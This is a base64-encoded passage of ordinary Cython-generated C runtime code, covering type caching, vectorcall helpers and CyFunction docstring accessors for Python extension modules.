fX1B5eF9QeVNlcXVlbmNlX011bHRpcGx5X0dlbmVyaWMoc2VxLCBtdWwpOwogICAgfQp9CgoKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9GZXRjaFNoYXJlZEN5dGhvbkFCSU1vZHVsZSh2b2lkKSB7CiAgICByZXR1cm4gX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlUmVmKF9fUFlYX0FCSV9NT0RVTEVfTkFNRSk7Cn0KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlEaWN0X1NldERlZmF1bHQoUHlPYmplY3QgKmQsIFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICpkZWZhdWx0X3ZhbHVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGlzX3NhZmVfdHlwZSkgewogICAgUHlPYmplY3QqIHZhbHVlOwogICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoaXNfc2FmZV90eXBlKTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHZhbHVlID0gUHlPYmplY3RfQ2FsbE1ldGhvZChkLCAic2V0ZGVmYXVsdCIsICJPTyIsIGtleSwgZGVmYXVsdF92YWx1ZSk7CiNlbGlmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAKICAgIFB5RGljdF9TZXREZWZhdWx0UmVmKGQsIGtleSwgZGVmYXVsdF92YWx1ZSwgJnZhbHVlKTsKI2Vsc2UKICAgIHZhbHVlID0gUHlEaWN0X1NldERlZmF1bHQoZCwga2V5LCBkZWZhdWx0X3ZhbHVlKTsKICAgIGlmICh1bmxpa2VseSghdmFsdWUpKSByZXR1cm4gTlVMTDsKICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiNlbmRpZgogICAgcmV0dXJuIHZhbHVlOwp9CgoKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEMwMDAwCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlUeXBlX0Zyb21NZXRhY2xhc3MoUHlUeXBlT2JqZWN0ICptZXRhY2xhc3MsIFB5T2JqZWN0ICptb2R1bGUsIFB5VHlwZV9TcGVjICpzcGVjLCBQeU9iamVjdCAqYmFzZXMpIHsKICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMobW9kdWxlLCBzcGVjLCBiYXNlcyk7CiAgICBpZiAocmVzdWx0ICYmIG1ldGFjbGFzcykgewogICAgICAgIFB5T2JqZWN0ICpvbGRfdHAgPSAoUHlPYmplY3QqKVB5X1RZUEUocmVzdWx0KTsKICAgIFB5X0lOQ1JFRigoUHlPYmplY3QqKW1ldGFjbGFzcyk7CiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAKICAgICAgICBQeV9TRVRfVFlQRShyZXN1bHQsIG1ldGFjbGFzcyk7CiNlbHNlCiAgICAgICAgcmVzdWx0LT5vYl90eXBlID0gbWV0YWNsYXNzOwojZW5kaWYKICAgICAgICBQeV9ERUNSRUYob2xkX3RwKTsKICAgIH0KICAgIHJldHVybiByZXN1bHQ7Cn0KI2Vsc2UKI2RlZmluZSBfX1B5eF9QeVR5cGVfRnJvbU1ldGFjbGFzcyhtZSwgbW8sIHMsIGIpIFB5VHlwZV9Gcm9tTWV0YWNsYXNzKG1lLCBtbywgcywgYikKI2VuZGlmCnN0YXRpYyBpbnQgX19QeXhfVmVyaWZ5Q2FjaGVkVHlwZShQeU9iamVjdCAqY2FjaGVkX3R5cGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBjaGFyICpuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlfc3NpemVfdCBleHBlY3RlZF9iYXNpY3NpemUpIHsKICAgIFB5X3NzaXplX3QgYmFzaWNzaXplOwogICAgaWYgKCFQeVR5cGVfQ2hlY2soY2FjaGVkX3R5cGUpKSB7CiAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgIlNoYXJlZCBDeXRob24gdHlwZSAlLjIwMHMgaXMgbm90IGEgdHlwZSBvYmplY3QiLCBuYW1lKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBpZiAoZXhwZWN0ZWRfYmFzaWNzaXplID09IDApIHsKICAgICAgICByZXR1cm4gMDsgLy8gc2l6ZSBpcyBpbmhlcml0ZWQsIG5vdGhpbmcgdXNlZnVsIHRvIGNoZWNrCiAgICB9CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeU9iamVjdCAqcHlfYmFzaWNzaXplOwogICAgcHlfYmFzaWNzaXplID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhjYWNoZWRfdHlwZSwgIl9fYmFzaWNzaXplX18iKTsKICAgIGlmICh1bmxpa2VseSghcHlfYmFzaWNzaXplKSkgcmV0dXJuIC0xOwogICAgYmFzaWNzaXplID0gUHlMb25nX0FzU3NpemVfdChweV9iYXNpY3NpemUpOwogICAgUHlfREVDUkVGKHB5X2Jhc2ljc2l6ZSk7CiAgICBweV9iYXNpY3NpemUgPSBOVUxMOwogICAgaWYgKHVubGlrZWx5KGJhc2ljc2l6ZSA9PSAoUHlfc3NpemVfdCktMSkgJiYgUHlFcnJfT2NjdXJyZWQoKSkgcmV0dXJuIC0xOwojZWxzZQogICAgYmFzaWNzaXplID0gKChQeVR5cGVPYmplY3QqKSBjYWNoZWRfdHlwZSktPnRwX2Jhc2ljc2l6ZTsKI2VuZGlmCiAgICBpZiAoYmFzaWNzaXplICE9IGV4cGVjdGVkX2Jhc2ljc2l6ZSkgewogICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICJTaGFyZWQgQ3l0aG9uIHR5cGUgJS4yMDBzIGhhcyB0aGUgd3Jvbmcgc2l6ZSwgdHJ5IHJlY29tcGlsaW5nIiwKICAgICAgICAgICAgbmFtZSk7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIFB5VHlwZU9iamVjdCAqX19QeXhfRmV0Y2hDb21tb25UeXBlRnJvbVNwZWMoUHlUeXBlT2JqZWN0ICptZXRhY2xhc3MsIFB5T2JqZWN0ICptb2R1bGUsIFB5VHlwZV9TcGVjICpzcGVjLCBQeU9iamVjdCAqYmFzZXMpIHsKICAgIFB5T2JqZWN0ICphYmlfbW9kdWxlID0gTlVMTCwgKmNhY2hlZF90eXBlID0gTlVMTCwgKmFiaV9tb2R1bGVfZGljdCwgKm5ld19jYWNoZWRfdHlwZSwgKnB5X29iamVjdF9uYW1lOwogICAgaW50IGdldF9pdGVtX3JlZl9yZXN1bHQ7CiAgICBjb25zdCBjaGFyKiBvYmplY3RfbmFtZSA9IHN0cnJjaHIoc3BlYy0+bmFtZSwgJy4nKTsKICAgIG9iamVjdF9uYW1lID0gb2JqZWN0X25hbWUgPyBvYmplY3RfbmFtZSsxIDogc3BlYy0+bmFtZTsKICAgIHB5X29iamVjdF9uYW1lID0gUHlVbmljb2RlX0Zyb21TdHJpbmcob2JqZWN0X25hbWUpOwogICAgaWYgKCFweV9vYmplY3RfbmFtZSkgcmV0dXJuIE5VTEw7CiAgICBhYmlfbW9kdWxlID0gX19QeXhfRmV0Y2hTaGFyZWRDeXRob25BQklNb2R1bGUoKTsKICAgIGlmICghYWJpX21vZHVsZSkgZ290byBkb25lOwogICAgYWJpX21vZHVsZV9kaWN0ID0gUHlNb2R1bGVfR2V0RGljdChhYmlfbW9kdWxlKTsKICAgIGlmICghYWJpX21vZHVsZV9kaWN0KSBnb3RvIGRvbmU7CiAgICBnZXRfaXRlbV9yZWZfcmVzdWx0ID0gX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoYWJpX21vZHVsZV9kaWN0LCBweV9vYmplY3RfbmFtZSwgJmNhY2hlZF90eXBlKTsKICAgIGlmIChnZXRfaXRlbV9yZWZfcmVzdWx0ID09IDEpIHsKICAgICAgICBpZiAoX19QeXhfVmVyaWZ5Q2FjaGVkVHlwZSgKICAgICAgICAgICAgICBjYWNoZWRfdHlwZSwKICAgICAgICAgICAgICBvYmplY3RfbmFtZSwKICAgICAgICAgICAgICBzcGVjLT5iYXNpY3NpemUpIDwgMCkgewogICAgICAgICAgICBnb3RvIGJhZDsKICAgICAgICB9CiAgICAgICAgZ290byBkb25lOwogICAgfSBlbHNlIGlmICh1bmxpa2VseShnZXRfaXRlbV9yZWZfcmVzdWx0ID09IC0xKSkgewogICAgICAgIGdvdG8gYmFkOwogICAgfQogICAgQ1lUSE9OX1VOVVNFRF9WQVIobW9kdWxlKTsKICAgIGNhY2hlZF90eXBlID0gX19QeXhfUHlUeXBlX0Zyb21NZXRhY2xhc3MobWV0YWNsYXNzLCBhYmlfbW9kdWxlLCBzcGVjLCBiYXNlcyk7CiAgICBpZiAodW5saWtlbHkoIWNhY2hlZF90eXBlKSkgZ290byBiYWQ7CiAgICBpZiAodW5saWtlbHkoX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYyhzcGVjLCAoUHlUeXBlT2JqZWN0ICopIGNhY2hlZF90eXBlKSA8IDApKSBnb3RvIGJhZDsKICAgIG5ld19jYWNoZWRfdHlwZSA9IF9fUHl4X1B5RGljdF9TZXREZWZhdWx0KGFiaV9tb2R1bGVfZGljdCwgcHlfb2JqZWN0X25hbWUsIGNhY2hlZF90eXBlLCAxKTsKICAgIGlmICh1bmxpa2VseShuZXdfY2FjaGVkX3R5cGUgIT0gY2FjaGVkX3R5cGUpKSB7CiAgICAgICAgaWYgKHVubGlrZWx5KCFuZXdfY2FjaGVkX3R5cGUpKSBnb3RvIGJhZDsKICAgICAgICBQeV9ERUNSRUYoY2FjaGVkX3R5cGUpOwogICAgICAgIGNhY2hlZF90eXBlID0gbmV3X2NhY2hlZF90eXBlOwogICAgICAgIGlmIChfX1B5eF9WZXJpZnlDYWNoZWRUeXBlKAogICAgICAgICAgICAgICAgY2FjaGVkX3R5cGUsCiAgICAgICAgICAgICAgICBvYmplY3RfbmFtZSwKICAgICAgICAgICAgICAgIHNwZWMtPmJhc2ljc2l6ZSkgPCAwKSB7CiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICBnb3RvIGRvbmU7CiAgICB9IGVsc2UgewogICAgICAgIFB5X0RFQ1JFRihuZXdfY2FjaGVkX3R5cGUpOwogICAgfQpkb25lOgogICAgUHlfWERFQ1JFRihhYmlfbW9kdWxlKTsKICAgIFB5X0RFQ1JFRihweV9vYmplY3RfbmFtZSk7CiAgICBhc3NlcnQoY2FjaGVkX3R5cGUgPT0gTlVMTCB8fCBQeVR5cGVfQ2hlY2soY2FjaGVkX3R5cGUpKTsKICAgIHJldHVybiAoUHlUeXBlT2JqZWN0ICopIGNhY2hlZF90eXBlOwpiYWQ6CiAgICBQeV9YREVDUkVGKGNhY2hlZF90eXBlKTsKICAgIGNhY2hlZF90eXBlID0gTlVMTDsKICAgIGdvdG8gZG9uZTsKfQoKCnN0YXRpYyBQeU9iamVjdCogX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfZ2V0X21vZHVsZShDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpzZWxmLCBDWVRIT05fVU5VU0VEIHZvaWQqIGNvbnRleHQpIHsKICAgIHJldHVybiBQeVVuaWNvZGVfRnJvbVN0cmluZyhfX1BZWF9BQklfTU9EVUxFX05BTUUpOwp9CnN0YXRpYyBQeUdldFNldERlZiBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19nZXRzZXRbXSA9IHsKICAgIHsiX19tb2R1bGVfXyIsIF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX2dldF9tb2R1bGUsIE5VTEwsIE5VTEwsIE5VTEx9LAogICAgezAsIDAsIDAsIDAsIDB9Cn07CnN0YXRpYyBQeVR5cGVfU2xvdCBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19zbG90c1tdID0gewogICAge1B5X3RwX2dldHNldCwgKHZvaWQgKilfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19nZXRzZXR9LAogICAgezAsIDB9Cn07CnN0YXRpYyBQeVR5cGVfU3BlYyBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19zcGVjID0gewogICAgX19QWVhfVFlQRV9NT0RVTEVfUFJFRklYICJfY29tbW9uX3R5cGVzX21ldGF0eXBlIiwKICAgIDAsCiAgICAwLAojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDAwMAogICAgUHlfVFBGTEFHU19JTU1VVEFCTEVUWVBFIHwKICAgIFB5X1RQRkxBR1NfRElTQUxMT1dfSU5TVEFOVElBVElPTiB8CiNlbmRpZgogICAgUHlfVFBGTEFHU19ERUZBVUxULAogICAgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3Nfc2xvdHMKfTsKc3RhdGljIGludCBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19pbml0KFB5T2JqZWN0ICptb2R1bGUpIHsKICAgIF9fcHl4X21zdGF0ZXR5cGUgKm1zdGF0ZSA9IF9fUHl4X1B5TW9kdWxlX0dldFN0YXRlKG1vZHVsZSk7CiAgICBQeU9iamVjdCAqYmFzZXMgPSBQeVR1cGxlX1BhY2soMSwgJlB5VHlwZV9UeXBlKTsKICAgIGlmICh1bmxpa2VseSghYmFzZXMpKSB7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgbXN0YXRlLT5fX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc1R5cGUgPSBfX1B5eF9GZXRjaENvbW1vblR5cGVGcm9tU3BlYyhOVUxMLCBtb2R1bGUsICZfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19zcGVjLCBiYXNlcyk7CiAgICBQeV9ERUNSRUYoYmFzZXMpOwogICAgaWYgKHVubGlrZWx5KG1zdGF0ZS0+X19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NUeXBlID09IE5VTEwpKSB7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIDA7Cn0KCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5TWV0aG9kX05ldyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp0eXApIHsKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBDWVRIT05fVU5VU0VEX1ZBUih0eXApOwogICAgaWYgKCFzZWxmKQogICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoZnVuYyk7CiAgICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwCiAgICB7CiAgICAgICAgUHlPYmplY3QgKmFyZ3NbXSA9IHtmdW5jLCBzZWxmfTsKICAgICAgICByZXN1bHQgPSBQeU9iamVjdF9WZWN0b3JjYWxsKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fUHl4X0NhY2hlZE1ldGhvZFR5cGUsIGFyZ3MsIDIsIE5VTEwpOwogICAgfQogICAgI2Vsc2UKICAgIHJlc3VsdCA9IFB5T2JqZWN0X0NhbGxGdW5jdGlvbk9iakFyZ3MoX19weXhfbXN0YXRlX2dsb2JhbC0+X19QeXhfQ2FjaGVkTWV0aG9kVHlwZSwgZnVuYywgc2VsZiwgTlVMTCk7CiAgICAjZW5kaWYKICAgIHJldHVybiByZXN1bHQ7Cn0KI2Vsc2UKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU1ldGhvZF9OZXcoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdHlwKSB7CiAgICBDWVRIT05fVU5VU0VEX1ZBUih0eXApOwogICAgaWYgKCFzZWxmKQogICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoZnVuYyk7CiAgICByZXR1cm4gUHlNZXRob2RfTmV3KGZ1bmMsIHNlbGYpOwp9CiNlbmRpZgoKCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTCAmJiAoQ1lUSE9OX1ZFQ1RPUkNBTEwgfHwgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwpCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlWZWN0b3JjYWxsX0Zhc3RDYWxsRGljdF9rdyhQeU9iamVjdCAqZnVuYywgX19weXhfdmVjdG9yY2FsbGZ1bmMgdmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3cpCnsKICAgIFB5T2JqZWN0ICpyZXMgPSBOVUxMOwogICAgUHlPYmplY3QgKmt3bmFtZXM7CiAgICBQeU9iamVjdCAqKm5ld2FyZ3M7CiAgICBQeU9iamVjdCAqKmt3dmFsdWVzOwogICAgUHlfc3NpemVfdCBpLCBwb3M7CiAgICBzaXplX3QgajsKICAgIFB5T2JqZWN0ICprZXksICp2YWx1ZTsKICAgIHVuc2lnbmVkIGxvbmcga2V5c19hcmVfc3RyaW5nczsKICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgIFB5X3NzaXplX3Qgbmt3ID0gUHlEaWN0X1NpemUoa3cpOwogICAgaWYgKHVubGlrZWx5KG5rdyA9PSAtMSkpIHJldHVybiBOVUxMOwogICAgI2Vsc2UKICAgIFB5X3NzaXplX3Qgbmt3ID0gUHlEaWN0X0dFVF9TSVpFKGt3KTsKICAgICNlbmRpZgogICAgbmV3YXJncyA9IChQeU9iamVjdCAqKilQeU1lbV9NYWxsb2MoKG5hcmdzICsgKHNpemVfdClua3cpICogc2l6ZW9mKGFyZ3NbMF0pKTsKICAgIGlmICh1bmxpa2VseShuZXdhcmdzID09IE5VTEwpKSB7CiAgICAgICAgUHlFcnJfTm9NZW1vcnkoKTsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIGZvciAoaiA9IDA7IGogPCBuYXJnczsgaisrKSBuZXdhcmdzW2pdID0gYXJnc1tqXTsKICAgIGt3bmFtZXMgPSBQeVR1cGxlX05ldyhua3cpOwogICAgaWYgKHVubGlrZWx5KGt3bmFtZXMgPT0gTlVMTCkpIHsKICAgICAgICBQeU1lbV9GcmVlKG5ld2FyZ3MpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAga3d2YWx1ZXMgPSBuZXdhcmdzICsgbmFyZ3M7CiAgICBwb3MgPSBpID0gMDsKICAgIGtleXNfYXJlX3N0cmluZ3MgPSBQeV9UUEZMQUdTX1VOSUNPREVfU1VCQ0xBU1M7CiAgICB3aGlsZSAoUHlEaWN0X05leHQoa3csICZwb3MsICZrZXksICZ2YWx1ZSkpIHsKICAgICAgICBrZXlzX2FyZV9zdHJpbmdzICY9CiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgICAgICAgICAgUHlUeXBlX0dldEZsYWdzKFB5X1RZUEUoa2V5KSk7CiAgICAgICAgI2Vsc2UKICAgICAgICAgICAgUHlfVFlQRShrZXkpLT50cF9mbGFnczsKICAgICAgICAjZW5kaWYKICAgICAgICBQeV9JTkNSRUYoa2V5KTsKICAgICAgICBQeV9JTkNSRUYodmFsdWUpOwogICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICAgICAgIGlmICh1bmxpa2VseShQeVR1cGxlX1NldEl0ZW0oa3duYW1lcywgaSwga2V5KSA8IDApKSBnb3RvIGNsZWFudXA7CiAgICAgICAgI2Vsc2UKICAgICAgICBQeVR1cGxlX1NFVF9JVEVNKGt3bmFtZXMsIGksIGtleSk7CiAgICAgICAgI2VuZGlmCiAgICAgICAga3d2YWx1ZXNbaV0gPSB2YWx1ZTsKICAgICAgICBpKys7CiAgICB9CiAgICBpZiAodW5saWtlbHkoIWtleXNfYXJlX3N0cmluZ3MpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwgImtleXdvcmRzIG11c3QgYmUgc3RyaW5ncyIpOwogICAgICAgIGdvdG8gY2xlYW51cDsKICAgIH0KICAgIHJlcyA9IHZjKGZ1bmMsIG5ld2FyZ3MsIG5hcmdzLCBrd25hbWVzKTsKY2xlYW51cDoKICAgIFB5X0RFQ1JFRihrd25hbWVzKTsKICAgIGZvciAoaSA9IDA7IGkgPCBua3c7IGkrKykKICAgICAgICBQeV9ERUNSRUYoa3d2YWx1ZXNbaV0pOwogICAgUHlNZW1fRnJlZShuZXdhcmdzKTsKICAgIHJldHVybiByZXM7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5VmVjdG9yY2FsbF9GYXN0Q2FsbERpY3QoUHlPYmplY3QgKmZ1bmMsIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIHZjLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJncywgUHlPYmplY3QgKmt3KQp7CiAgICBQeV9zc2l6ZV90IGt3X3NpemUgPQogICAgICAgIGxpa2VseShrdyA9PSBOVUxMKSA/CiAgICAgICAgMCA6CiNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICBQeURpY3RfU2l6ZShrdyk7CiNlbHNlCiAgICAgICAgUHlEaWN0X0dFVF9TSVpFKGt3KTsKI2VuZGlmCiAgICBpZiAoa3dfc2l6ZSA9PSAwKSB7CiAgICAgICAgcmV0dXJuIHZjKGZ1bmMsIGFyZ3MsIG5hcmdzLCBOVUxMKTsKICAgIH0KI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgZWxzZSBpZiAodW5saWtlbHkoa3dfc2l6ZSA9PSAtMSkpIHsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KI2VuZGlmCiAgICByZXR1cm4gX19QeXhfUHlWZWN0b3JjYWxsX0Zhc3RDYWxsRGljdF9rdyhmdW5jLCB2YywgYXJncywgbmFyZ3MsIGt3KTsKfQojZW5kaWYKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfX0lzU2FtZUN5T3JDRnVuY3Rpb25Ob01ldGhvZChQeU9iamVjdCAqZnVuYywgdm9pZCAoKmNmdW5jKSh2b2lkKSkgewogICAgaWYgKF9fUHl4X0N5RnVuY3Rpb25fQ2hlY2soZnVuYykpIHsKICAgICAgICByZXR1cm4gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmdW5jKS0+ZnVuYykgPT0gKFB5Q0Z1bmN0aW9uKSBjZnVuYzsKICAgIH0gZWxzZSBpZiAoUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykpIHsKICAgICAgICByZXR1cm4gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oZnVuYykgPT0gKFB5Q0Z1bmN0aW9uKSBjZnVuYzsKICAgIH0KICAgIHJldHVybiAwOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbihQeU9iamVjdCAqZnVuYywgdm9pZCAoKmNmdW5jKSh2b2lkKSkgewogICAgaWYgKChQeU9iamVjdCopUHlfVFlQRShmdW5jKSA9PSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9DYWNoZWRNZXRob2RUeXBlKSB7CiAgICAgICAgaW50IHJlc3VsdDsKICAgICAgICBQeU9iamVjdCAqbmV3RnVuYyA9IFB5T2JqZWN0X0dldEF0dHIoZnVuYywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Z1bmMpOwogICAgICAgIGlmICh1bmxpa2VseSghbmV3RnVuYykpIHsKICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTsgLy8gSXQncyBvbmx5IGFuIG9wdGltaXphdGlvbiwgc28gZG9uJ3QgdGhyb3cgYW4gZXJyb3IKICAgICAgICAgICAgcmV0dXJuIDA7CiAgICAgICAgfQogICAgICAgIHJlc3VsdCA9IF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uTm9NZXRob2QobmV3RnVuYywgY2Z1bmMpOwogICAgICAgIFB5X0RFQ1JFRihuZXdGdW5jKTsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQogICAgcmV0dXJuIF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uTm9NZXRob2QoZnVuYywgY2Z1bmMpOwp9CiNlbHNlCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbihQeU9iamVjdCAqZnVuYywgdm9pZCAoKmNmdW5jKSh2b2lkKSkgewogICAgaWYgKFB5TWV0aG9kX0NoZWNrKGZ1bmMpKSB7CiAgICAgICAgZnVuYyA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihmdW5jKTsKICAgIH0KICAgIHJldHVybiBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykgJiYgX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9GVU5DVElPTihmdW5jKSA9PSAoUHlDRnVuY3Rpb24pIGNmdW5jOwp9CiNlbmRpZgpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19DeUZ1bmN0aW9uX1NldENsYXNzT2JqKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqIGYsIFB5T2JqZWN0KiBjbGFzc29iaikgewojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMEIxIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKAogICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmooZiksCiAgICAgICAgICAgICgoY2xhc3NvYmopID8gX19QeXhfTmV3UmVmKGNsYXNzb2JqKSA6IE5VTEwpKTsKI2Vsc2UKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKAogICAgICAgICgoUHlDTWV0aG9kT2JqZWN0ICopIChmKSktPm1tX2NsYXNzLAogICAgICAgIChQeVR5cGVPYmplY3QqKSgoY2xhc3NvYmopID8gX19QeXhfTmV3UmVmKGNsYXNzb2JqKSA6IE5VTEwpKTsKI2VuZGlmCn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfZG9jX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkKewogICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX2RvYyA9PSBOVUxMKSkgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgIG9wLT5mdW5jX2RvYyA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcob3AtPmZ1bmMsICJfX2RvY19fIik7CiAgICAgICAgaWYgKHVubGlrZWx5KCFvcC0+ZnVuY19kb2MpKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgICAgICBpZiAoKChQeUNGdW5jdGlvbk9iamVjdCopb3ApLT5tX21sLT5tbF9kb2MpIHsKICAgICAgICAgICAgb3AtPmZ1bmNfZG9jID0gUHlVbmljb2RlX0Zyb21TdHJpbmcoKChQeUNGdW5jdGlvbk9iamVjdCopb3ApLT5tX21sLT5tbF9kb2MpOwogICAgICAgICAgICBpZiAodW5saWtlbHkob3AtPmZ1bmNfZG9jID09IE5VTEwpKQogICAgICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUHlfSU5DUkVGKFB5X05vbmUpOwogICAgICAgICAgICByZXR1cm4gUHlfTm9uZTsKICAgICAgICB9CiNlbmRpZgogICAgfQogICAgUHlfSU5DUkVGKG9wLT5mdW5jX2RvYyk7CiAgICByZXR1cm4gb3AtPmZ1bmNfZG9jOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RvYyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY2xvc3VyZSkgewogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNsb3N1cmUpOwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX2dldF9kb2NfbG9ja2VkKG9wKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBpbnQKX19QeXhfQ3lGdW5jdGlvbl9zZXRfZG9jKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCAqdmFsdWUsIHZvaWQgKmNvbnRleHQpCnsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgaWYgKHZhbHVlID09IE5VTEwpIHsKICAgICAgICB2YWx1ZSA9IFB5X05vbmU7CiAgICB9CiAgICBQeV9JTkNSRUYodmF